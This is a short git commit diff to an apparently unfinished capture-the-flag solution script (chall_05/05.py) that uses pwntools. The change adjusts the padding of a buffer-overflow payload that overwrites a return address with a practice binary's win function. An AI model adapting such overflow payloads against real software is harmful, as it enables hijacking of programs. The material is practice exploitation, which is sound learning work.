81123422d6cd1b13735fa6138c1600970e2b6a4b
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-05 20:44:04 -0400

    # NOT FINISHED

--- chall_05/05.py
+++ chall_05/05.py
@@ -5,7 +5,7 @@ p.recvuntil('I wonder what this is: ')
 _ = p.recvline().strip()
 stack = int(_,16)
 binary.address = stack - binary.sym.main
-p.sendline(56*b'A' + p64(binary.sym.win) + b'')
+p.sendline((0x60 - 0x8)*b'A' + p64(binary.sym.win) + b'')
 p.interactive()
 
 # NOT FINISHED
